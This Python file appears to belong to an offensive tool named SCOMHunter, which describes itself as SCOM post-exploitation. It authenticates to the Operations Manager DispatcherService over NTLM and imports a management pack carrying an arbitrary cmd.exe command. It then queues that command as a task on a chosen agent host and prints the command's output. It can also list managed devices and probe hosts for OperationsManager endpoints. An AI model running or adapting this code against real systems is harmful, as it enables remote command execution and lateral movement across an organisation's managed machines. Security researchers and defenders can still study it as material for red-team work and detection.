#!/usr/bin/env python3
"""Authenticated SCOM post-exploitation over TCP/5724.

This talks directly to DispatcherService using MC-NMF/NBFS over an
NTLM-protected NegotiateStream.
"""
import getpass, hashlib, http.client, json, os, re, socket, ssl, struct, sys, time, uuid, zlib
from types import SimpleNamespace
import spnego
from xml.sax.saxutils import escape
from xml.etree import ElementTree

# Captured, standard ITaskRuntimeService.SubmitTasks envelope.  Unlike the
# discarded Connect construction, this is reused only after normal RBAC auth.
## legacy capture markers removed; active markers are loaded from resources
## runtime GUID markers are defined below
## target marker is defined from the resource fixture below
## override marker is defined from the resource fixture below
## task marker is defined from the resource fixture below
HS_CLASS = uuid.UUID('ab4c891f-3359-3fb6-0704-075fbfe36710')
PN_PROP = uuid.UUID('5c324096-d928-76db-e9e7-e629dcc261b1')
COMMAND_MP = 'SCOMHunter.CommandExecution'
COMMAND_TASK = 'SCOMHunter.CommandExecution.Task'

def _resource(name):
    # Fixtures are decoded NBFS bytes on disk, not base64 or configuration.
    path=os.path.join(os.path.dirname(__file__),'..','resources','postex',name)
    with open(path,'rb') as f: return f.read()

CONNECT_PREFIX=_resource('connect_prefix')
CONNECT_MIDDLE=_resource('connect_middle')
CONNECT_SUFFIX=_resource('connect_suffix')

# Neutralized protocol fixtures.  The original captures are retained only as
# a fallback for older checkouts; active requests load these resource files.
TASK_TEMPLATE=_resource('submit_tasks')
TASK_OLD_VIA=b'<DISPATCHER_VIA>'
TASK_OLD_OVERRIDES=b'<OVERRIDES>'
TASK_OLD_JOB=b'<JOB_GUID>' + b' ' * (36-len(b'<JOB_GUID>'))
TASK_OLD_BATCH=b'<BATCH_GUID>' + b' ' * (36-len(b'<BATCH_GUID>'))
TASK_OLD_TARGET=b'<TARGET_HS_ID>' + b' ' * (36-len(b'<TARGET_HS_ID>'))
TASK_OLD_ID=b'<TASK_GUID>' + b' ' * (36-len(b'<TASK_GUID>'))
OLD_VERSION=b'<SERVER_VERSION>'
IMPORT_TEMPLATE=_resource('import_management_pack')
IMPORT_OLD_VIA=b'<DISPATCHER_VIA>'
IMPORT_OLD_MP=b'<MANAGEMENT_PACK>'
IMPORT_OLD_MESSAGE=b'<MESSAGE_ID>'
IMPORT_OLD_CORRELATION=b'<CORRELATION_ID>'
UNINSTALL_TEMPLATE=_resource('uninstall_management_pack')
UNINSTALL_OLD_ID=b'<MANAGEMENT_PACK_ID>' + b' ' * (36-len(b'<MANAGEMENT_PACK_ID>'))
DEVICES=_resource('agent_devices')
OLD_VIA=b'<DISPATCHER_VIA>'

def vi(n):
    # MC-NMF uses a compact unsigned variable-length integer encoding.
    out=bytearray()
    while n>=128: out.append((n&127)|128); n>>=7
    out.append(n); return bytes(out)

def read_vi(d,p):
    v=s=0
    while True:
        b=d[p]; p+=1; v|=(b&127)<<s
        if b<128: return v,p
        s+=7

def exact(s,n):
    d=b''
    while len(d)<n:
        x=s.recv(n-len(d))
        if not x: raise EOFError('peer closed')
        d+=x
    return d

def nrecv(s): return exact(s,int.from_bytes(exact(s,4),'little'))
def nsend(s,d): s.sendall(struct.pack('<I',len(d))+d)
def chars8(d):
    if len(d)>255: raise ValueError('server/via is too long')
    return bytes([len(d)])+d

def replace_text(msg,old,new):
    # Replace one NBFS text record and rebuild its length prefix when needed.
    p=msg.find(old)
    if p<2 or msg.find(old,p+1)>=0 or msg[p-1]!=len(old): raise ValueError('bad template replacement')
    tag=msg[p-2]&1; rec=bytearray()
    while len(new)>255:
        rec+=bytes([0x9a|(tag if len(new)==256 else 0)])+struct.pack('<H',256)+new[:256]; new=new[256:]
    if new: rec+=bytes([0x98|tag,len(new)])+new
    elif not rec: rec+=bytes([0x98|tag,0])
    return msg[:p-2]+rec+msg[p+len(old):]

def replace_fixed(msg,old,new):
    if len(new)>len(old): raise ValueError('replacement is longer than fixed template field')
    return msg.replace(old,new+b' '*(len(old)-len(new)),1)

def replace_guid_marker(msg, marker, value):
    value=value.encode() if isinstance(value,str) else value
    if len(value)!=len(marker): raise ValueError('GUID marker length mismatch')
    if not msg.count(marker): raise ValueError('GUID marker absent')
    return msg.replace(marker,value)

def submit_task(server,port,target,task_id,override_items,version,batch_id=None,register_callback=False):
    # Build a normal authenticated SubmitTasks request for one HealthService.
    msg=TASK_TEMPLATE
    # Restore the captured ShortElement length byte for batchId.
    msg=msg.replace(b'\x40\x77batchId',b'\x40\x07batchId',1)
    bad=b'http://schemas.revocable.com/2004/07/Microsoft.EnterpriseManagement.Common'
    good=b'http://schemas.datacontract.org/2004/07/Microsoft.EnterpriseManagement.Common'
    if bad in msg:
        p=msg.find(bad); msg=msg[:p-1]+bytes([len(good)])+good+msg[p+len(bad):]
    rows=''.join(f'<Override><Path>{escape(k)}</Path><Value>{escape(v)}</Value></Override>' for k,v in override_items)
    overrides=f'<Overrides>{rows}</Overrides>'.encode()
    msg=replace_text(msg,TASK_OLD_VIA,f'net.tcp://{server}:{port}/DispatcherServiceSSL'.encode())
    msg=replace_text(msg,TASK_OLD_OVERRIDES,overrides)
    batch_id=batch_id or uuid.uuid4()
    msg=replace_guid_marker(msg,TASK_OLD_JOB,str(uuid.uuid4()))
    msg=replace_guid_marker(msg,TASK_OLD_BATCH,str(batch_id))
    msg=replace_guid_marker(msg,TASK_OLD_TARGET,str(health_id(target)))
    msg=replace_guid_marker(msg,TASK_OLD_ID,str(task_id if isinstance(task_id,uuid.UUID) else uuid.UUID(task_id)))
    msg=replace_text(msg,OLD_VERSION,version.encode())
    if register_callback:
        old=b'\x40\x10registerCallback\x99\x05false'
        new=b'\x40\x10registerCallback\x99\x04true'
        if msg.count(old)!=1: raise ValueError('registerCallback field absent')
        msg=msg.replace(old,new,1)
    # The captured envelope contains a legacy lab override as layout padding.
    # It must never survive into a transmitted SubmitTasks message.
    if any(marker in msg for marker in (b'ServiceName', b'binPath', b'LocalSystem')):
        raise RuntimeError('refusing to transmit legacy service/binPath override')
    return msg

def health_id(host):
    text=f'TypeId={{{str(HS_CLASS).upper()}}},{{{str(PN_PROP).upper()}}}={host.upper()}'
    return uuid.UUID(bytes_le=hashlib.sha1(text.encode('utf-16le')).digest()[:16])

def mp_element_id(mp_name, element_name, public_key_token=None):
    """SCOM's fn_MPObjectId-compatible ID for a management-pack element."""
    if mp_name == element_name:
        text=f'MPName={mp_name}' if not public_key_token else f'MPName={mp_name},KeyToken={public_key_token}'
    elif public_key_token:
        text=f'MPName={mp_name},KeyToken={public_key_token},ObjectId={element_name}'
    else:
        text=f'MPName={mp_name},ObjectId={element_name}'
    return uuid.UUID(bytes_le=hashlib.sha1(text.encode('utf-16le')).digest()[:16])

def build_import(server,port,management_pack,version):
    msg=replace_text(IMPORT_TEMPLATE,IMPORT_OLD_VIA,f'net.tcp://{server}:{port}/DispatcherServiceSSL'.encode())
    msg=replace_text(msg,IMPORT_OLD_MP,management_pack.encode())
    msg=replace_text(msg,OLD_VERSION,version.encode())
    msg=replace_text(msg,IMPORT_OLD_MESSAGE,f'urn:uuid:{uuid.uuid4()}'.encode())
    return replace_text(msg,IMPORT_OLD_CORRELATION,uuid.uuid4().hex.encode())

def build_uninstall(server,port,management_pack_id,version):
    msg=replace_text(UNINSTALL_TEMPLATE,IMPORT_OLD_VIA,f'net.tcp://{server}:{port}/DispatcherServiceSSL'.encode())
    msg=replace_text(msg,UNINSTALL_OLD_ID,str(management_pack_id).encode())
    msg=replace_text(msg,OLD_VERSION,version.encode())
    return replace_text(msg,IMPORT_OLD_CORRELATION,uuid.uuid4().hex.encode())

def normalize_command(command):
    """Return the command body for the bundled cmd.exe task.

    The task itself launches cmd.exe.  Accepting another ``cmd.exe /c``
    wrapper is convenient, but nesting it makes redirection and quoting
    dependent on two command-line parsers.  Strip one outer wrapper while
    leaving the command body (including redirection) untouched.
    """
    value = command.strip()
    match = re.match(r'^(?:"[^"]*\\cmd(?:\.exe)?"|[^\s]+\\cmd(?:\.exe)?|cmd(?:\.exe)?)\s+/[cC]\s+(.+)$', value)
    if match:
        value = match.group(1).strip()
        if len(value) >= 2 and value[0] == value[-1] == '"':
            value = value[1:-1]
    if not value:
        raise ValueError('command body is empty')
    return value

def command_pack_xml(command, pack_name):
    """Build the bundled task MP with a concrete command line.

    Some SCOM builds accept SubmitTasks but do not apply overrides to custom
    command-executor actions.  Embedding the command in the task definition
    lets us distinguish that case from a target/agent scheduling problem.
    """
    pack_path = os.path.join(os.path.dirname(__file__),'..','resources','postex','SCOMHunter.CommandExecution.xml')
    with open(pack_path, encoding='utf-8') as f:
        pack = f.read()
    line = '/d /s /c ' + command
    task_name = pack_name + '.Task'
    # SCOM ignores imports that do not advance the management-pack version.
    # Use a bounded timestamp revision so repeated commands update the task.
    stamp=time.time_ns()//1_000_000
    version=f'1.{(stamp>>32)&0xffff}.{(stamp>>16)&0xffff}.{stamp&0xffff}'
    pack = pack.replace('<Version>1.0.0.0</Version>', f'<Version>{version}</Version>', 1)
    pack = pack.replace(COMMAND_TASK, '__SCOMHUNTER_TASK_ID__')
    pack = pack.replace(COMMAND_MP, pack_name)
    pack = pack.replace('__SCOMHUNTER_TASK_ID__', task_name)
    pack = pack.replace('SCOMHunter Command Execution', pack_name, 1)
    return pack.replace(
        '<CommandLine>/d /s /c echo SCOMHunter command task installed</CommandLine>',
        '<CommandLine>' + escape(line) + '</CommandLine>', 1)

def decode_env(d):
    if not d or d[0]!=6: return d
    n,p=read_vi(d,1); d=d[p:p+n]
    if len(d)!=n: raise RuntimeError('truncated MC-NMF response')
    return zlib.decompress(d,31) if d.startswith(b'\x1f\x8b') else d

def nbfs_text(d,p):
    """Read consecutive literal UTF-8 NBFS text records at *p*."""
    out=bytearray()
    while p<len(d) and d[p] in (0x98,0x99,0x9a,0x9b,0x9c,0x9d):
        tag=d[p]; p+=1
        size_len={0x98:1,0x99:1,0x9a:2,0x9b:2,0x9c:4,0x9d:4}[tag]
        if p+size_len>len(d): raise RuntimeError('truncated NBFS text length')
        n=int.from_bytes(d[p:p+size_len],'little'); p+=size_len
        if p+n>len(d): raise RuntimeError('truncated NBFS text')
        out+=d[p:p+n]; p+=n
        if tag&1: break
    return out.decode(errors='replace'),p

def nbfs_integer(d,p):
    if p>=len(d): raise RuntimeError('missing NBFS integer')
    tag=d[p]; p+=1
    if tag in (0x80,0x81): return 0,p
    if tag in (0x82,0x83): return 1,p
    widths={0x88:1,0x89:1,0x8a:2,0x8b:2,0x8c:4,0x8d:4,0x8e:8,0x8f:8}
    n=widths.get(tag)
    if not n or p+n>len(d): raise RuntimeError(f'unsupported NBFS integer record 0x{tag:02x}')
    return int.from_bytes(d[p:p+n],'little',signed=True),p+n

def task_result_values(d):
    """Decode the one-row ResultSet sent by TaskStatusChangeNotification."""
    p=d.find(b'resultList')
    if p<0: return []
    values=[]
    while True:
        p=d.find(b'\x60\x07anyType',p)
        if p<0: break
        type_at=d.find(b'\x04type',p,p+128)
        if type_at<0: break
        type_name,q=nbfs_text(d,type_at+5)
        if not type_name.startswith('d:') or q>=len(d) or d[q]!=0x09:
            p+=1; continue
        q+=1
        prefix_len=d[q]; q+=1+prefix_len
        namespace_len=d[q]; q+=1+namespace_len
        if q>=len(d) or d[q]==0x01:
            value=None
        elif type_name in ('d:string','d:guid'):
            value,_=nbfs_text(d,q)
        elif type_name in ('d:unsignedByte','d:int','d:long'):
            value,_=nbfs_integer(d,q)
        elif type_name=='d:dateTime':
            value=None
        else:
            value=None
        values.append(value)
        p=q+1
    return values

TASK_STATUS={0:'Scheduled',1:'Started',2:'Succeeded',3:'Failed',4:'Canceled',
             5:'CancelPending',6:'CompletedWithInfo',7:'ResumePending',
             8:'Suspended',9:'SuspendPending',10:'SuspendedWithInfo'}

def parse_task_notification(d):
    if b'TaskStatusChangeNotification' not in d: return None
    values=task_result_values(d)
    if len(values)<11 or not isinstance(values[8],int): return None
    return dict(job_id=values[0],task_id=values[1],batch_id=values[2],
                submitted_by=values[3],running_as=values[4],target_id=values[5],
                target_class_id=values[6],location_id=values[7],status=values[8],
                output=values[9],error_code=values[10],
                error_message=values[11] if len(values)>11 else None)

def parse_command_result(output):
    if not output: return None
    try:
        root=ElementTree.fromstring(output)
        if root.tag!='DataItem' or root.get('type')!='System.CommandOutput': return None
        return {name:root.findtext(name) or '' for name in ('StdOut','StdErr','ExitCode','ProcessError')}
    except ElementTree.ParseError:
        return None

class Session:
    def __init__(self,a,password):
        # Establish TCP, negotiate MC-NMF, then authenticate DispatcherService.
        # with the supplied user's NTLM credentials.
        self.endpoint=f'net.tcp://{a.server}:{a.port}/DispatcherService'
        self.c=spnego.client(f'{a.domain}\\{a.username}',password,protocol='ntlm',hostname=a.server,service='MSOMSdkSvc',options=spnego.NegotiateOptions.use_ntlm)
        self.s=socket.create_connection((a.address or a.server,a.port),a.timeout); self.s.settimeout(a.timeout)
        via=f'net.tcp://{a.server}:{a.port}/DispatcherService'.encode(); neg=b'application/negotiate'
        self.s.sendall(b'\x00\x01\x00\x01\x02\x02'+vi(len(via))+via+b'\x04\x12application/x-gzip\x09'+bytes([len(neg)])+neg)
        if exact(self.s,1)!=b'\x0a': raise RuntimeError('NegotiateStream unavailable')
        t=self.c.step(); self.s.sendall(b'\x16\x01\x00'+struct.pack('>H',len(t))+t)
        h=exact(self.s,5); t=self.c.step(exact(self.s,struct.unpack('>H',h[3:])[0]))
        self.s.sendall(b'\x14\x01\x00'+struct.pack('>H',len(t))+t)
        if exact(self.s,5)[0]!=0x14: raise RuntimeError('NTLM rejected')
        nsend(self.s,self.c.wrap(b'\x0c',encrypt=True).data)
        if self.c.unwrap(nrecv(self.s)).data!=b'\x0b': raise RuntimeError('NMF rejected')
    def receive(self,timeout=None):
        old_timeout=self.s.gettimeout()
        if timeout is not None: self.s.settimeout(timeout)
        try:
            d=bytearray(self.c.unwrap(nrecv(self.s)).data)
            if d and d[0]==6:
                n,p=read_vi(d,1)
                while len(d)-p<n: d+=self.c.unwrap(nrecv(self.s)).data
            return decode_env(bytes(d))
        finally:
            if timeout is not None: self.s.settimeout(old_timeout)
    def call(self,msg,raise_fault=True):
        # Dispatcher requests are encrypted and length-framed in this channel.
        nsend(self.s,self.c.wrap(b'\x06'+vi(len(msg))+msg,encrypt=True).data)
        out=self.receive()
        fault_markers=(b'ExceptionDetail', b'InternalServiceFault',
                       b'ObjectNotFoundException',
                       b'http://www.w3.org/2003/05/soap-envelope/Fault')
        if raise_fault and any(marker in out for marker in fault_markers):
            if os.getenv('SCOM_DEBUG'):
                print(b' | '.join(re.findall(rb'[ -~]{4,}',out)).decode(errors='replace'),file=sys.stderr)
            raise RuntimeError('dispatcher fault: '+b' | '.join(re.findall(rb'[ -~]{6,}',out))[-1200:].decode(errors='replace'))
        return out

def metadata(r):
    vs=re.findall(rb'(?<![0-9.])[0-9]+(?:\.[0-9]+){3}(?![0-9.])',r)
    row=re.search(rb'\$[0-9a-fA-F]{8}(?:-[0-9a-fA-F]{4}){3}-[0-9a-fA-F]{12}',r)
    vals=[]; i=row.end() if row else len(r)
    while i+2<=len(r) and i<(row.end()+512 if row else len(r)):
        if r[i] in (0x98,0x99):
            n=r[i+1]; value=r[i+2:i+2+n]
            if len(value)==n and value and all(32<=c<127 for c in value): vals.append(value.decode())
            i+=n+2
        else: i+=1
    excluded={'anyType','Result','valueList','nil','true','false'}
    names=[x for x in vals if x not in excluded and ':' not in x and '/' not in x and not re.fullmatch(r'[0-9]+(?:\.[0-9]+){3}',x)]
    return (names[0] if names else 'unknown',vs[-1].decode() if vs else None)

def web_probe(host,port,tls,timeout):
    scheme='https' if tls else 'http'
    url=f'{scheme}://{host}:{port}/OperationsManager'
    try:
        ctx=ssl._create_unverified_context() if tls else None
        c=(http.client.HTTPSConnection(host,port,timeout=timeout,context=ctx) if tls else
           http.client.HTTPConnection(host,port,timeout=timeout))
        c.request('POST','/OperationsManager/authenticate',json.dumps('Windows'),
                  {'Content-Type':'application/json'})
        r=c.getresponse(); r.read(8192)
        return url,r.status
    except (OSError,http.client.HTTPException): return url,None

def run(server,address,port,domain,username,password,timeout,connect_only=False,
        list_devices=False,find_operationsmanager=False,target_host=None,command=None,
        remove_command_pack=False,command_pack_name=COMMAND_MP,no_wait=False,
        result_timeout=330):
    a=SimpleNamespace(server=server,address=address,port=port,domain=domain,
                      username=username,timeout=timeout,connect_only=connect_only,
                      list_devices=list_devices,find_operationsmanager=find_operationsmanager,
                      target_host=target_host,command=command,
                      remove_command_pack=remove_command_pack,
                      command_pack_name=command_pack_name,no_wait=no_wait,
                      result_timeout=result_timeout)
    if command and not target_host: raise ValueError('--command requires --target-host')
    if target_host and not command: raise ValueError('--target-host is only valid with --command')
    if no_wait and not command: raise ValueError('--no-wait is only valid with --command')
    if not 1<=result_timeout<=3600: raise ValueError('--result-timeout must be between 1 and 3600 seconds')
    if not re.fullmatch(r'[A-Za-z][A-Za-z0-9_.-]{0,99}',command_pack_name):
        raise ValueError('--command-pack-name must be a valid SCOM identifier')
    pw=password or os.getenv('SCOM_PASSWORD') or getpass.getpass('Password: ')
    s=Session(a,pw)
    print(f'dispatcher_endpoint={s.endpoint}')
    via=f'net.tcp://{a.server}:{a.port}/DispatcherService'.encode()
    # Empty tier name is the ordinary role-based connection. Never put the
    # server name here: that is the vulnerable self-tier takeover construction.
    conn=s.call(CONNECT_PREFIX+chars8(via)+CONNECT_MIDDLE+chars8(b'')+CONNECT_SUFFIX)
    mg,ver=metadata(conn); print(f'authenticated=true authz=outer_ntlm_user_role tiered_management_group_name=empty management_group={mg} server_build={ver or "unknown"}')
    if a.remove_command_pack:
        pack_id=mp_element_id(a.command_pack_name,a.command_pack_name)
        s.call(build_uninstall(a.server,a.port,pack_id,ver))
        print(f'management_pack_removed=true id={a.command_pack_name} pack_id={pack_id}')
        return
    if a.command:
        # Import a task with the command embedded in its MP, then queue it for
        # the target agent. SubmitTasks acknowledges queuing, not completion.
        command_body=normalize_command(a.command)
        # Import a concrete task definition.  This avoids relying on a
        # CommandLine override, which is inconsistently honored by SCOM
        # server builds even though SubmitTasks itself succeeds.
        task_name=a.command_pack_name + '.Task'
        s.call(build_import(a.server,a.port,command_pack_xml(command_body,a.command_pack_name),ver))
        print(f'management_pack_ready=true id={a.command_pack_name}')
        task_id=mp_element_id(a.command_pack_name,task_name)
        batch_id=uuid.uuid4()
        command_response=s.call(submit_task(a.server,a.port,a.target_host,task_id,[],ver,batch_id,
                                            register_callback=not a.no_wait))
        if os.getenv('SCOM_DEBUG'):
            print(b' | '.join(re.findall(rb'[ -~]{4,}',command_response)).decode(errors='replace'),file=sys.stderr)
        # SubmitTasks is asynchronous: an empty response is only a dispatcher
        # acknowledgement.  Authorization and execution happen later on the
        # target HealthService and are not represented in this response.
        print(f'command_queued=true target={a.target_host} command={command_body!r}')
        print(f'task_id={task_id}')
        print(f'batch_id={batch_id}')
        if a.no_wait:
            print('execution_status=not_confirmed dispatcher_ack_only=true')
        else:
            deadline=time.monotonic()+a.result_timeout; last_status=None; result=None
            while time.monotonic()<deadline:
                try: notice=s.receive(min(a.timeout,max(0.1,deadline-time.monotonic())))
                except socket.timeout: continue
                row=parse_task_notification(notice)
                if not row or str(row['batch_id']).lower()!=str(batch_id): continue
                result=row; status=row['status']
                if status!=last_status:
                    print(f'task_status={TASK_STATUS.get(status,str(status))}',flush=True)
                    last_status=status
                if status in (2,3,4,6): break
            if not result or result['status'] not in (2,3,4,6):
                raise RuntimeError(f'timed out waiting for terminal task result for batch {batch_id}')
            detail=parse_command_result(result['output'])
            confirmed=detail is not None
            command_ok=(confirmed and detail['ExitCode']=='0' and not detail['ProcessError'])
            print(f'dispatcher_ack_only=false task_completion_confirmed=true command_execution_confirmed={str(confirmed).lower()} command_succeeded={str(command_ok).lower()}')
            print(f'task_target_id={result["target_id"]} task_location_id={result["location_id"]}')
            if result['running_as'] is not None: print('running_as='+result['running_as'])
            if result['error_code'] is not None: print(f'scom_error_code={result["error_code"]}')
            if result['error_message'] is not None: print('scom_error_message='+json.dumps(result['error_message']))
            if detail:
                print(f'command_exit_code={detail["ExitCode"] or "unknown"}')
                print('stdout='+json.dumps(detail['StdOut']))
                print('stderr='+json.dumps(detail['StdErr']))
                if detail['ProcessError']: print('process_error='+json.dumps(detail['ProcessError']))
            if result['status']!=2 or not command_ok: return 1
    need_devices=a.list_devices or a.find_operationsmanager
    if need_devices:
        q=replace_text(DEVICES,OLD_VIA,f'net.tcp://{a.server}:{a.port}/DispatcherServiceSSL'.encode())
        if ver: q=replace_text(q,OLD_VERSION,ver.encode())
        r=s.call(q); names=sorted(set(x.decode().lower() for x in re.findall(rb'Microsoft\.Windows\.Computer:([A-Za-z0-9_.-]+)',r)))
        if a.list_devices:
            print(f'device_count={len(names)}')
            for name in names: print(f'device={name} health_service_id={health_id(name)}')
        if a.find_operationsmanager:
            candidates=[a.address or a.server]+[x for x in names if x != a.server.lower()]
            found=[]
            for host in candidates:
                for port,tls in ((80,False),(443,True)):
                    url,status=web_probe(host,port,tls,min(a.timeout,8))
                    if status is not None:
                        found.append((url,status)); print(f'operationsmanager_endpoint={url} status={status} source=http_probe')
            print(f'operationsmanager_endpoint_count={len(found)}')
    return 0
